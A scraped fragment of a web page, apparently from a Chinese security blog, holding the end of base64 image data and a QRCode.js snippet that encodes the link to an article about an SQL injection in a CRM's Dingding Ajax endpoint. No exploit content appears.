GNrz2By0AgU4cRV9uE5PQh3ImL+mLX5ZD6ntNXh+TgimasEdVFSK0+hHcfRl2/IyQHIz7Knf3LQM7mvv73J/BtA/Ep638EyNPySIfkeh+IDkH9Z9B7wlirvkJ7P+uv8uqi/eQiZH/A/kn99mZf3/aGQKbsnw/CfQrUv4rWi9ZD+sMVe6Zze4n6IqSnfkcYfRh57/Msr9y3DaSa7fX3J3AZSH8a5Ktb6YvmVhzmT5N1IiQHI+rb/4x6kBo99RVC8vqrOhhzMHLrn8XZfS4DebbZzv0/J3AMBDJtuI9f3QaM/XwqILr9ui7vvlyE9IHn/6/G4bMGrnWz3oDygX2PGl0HPn53pg/hEFQvPAZSZK/Xn8AeyOtnMOzgPwAAAP//SKrPGAAAAAZJREFUAwAp1FvUOSmEZAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxProviderList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 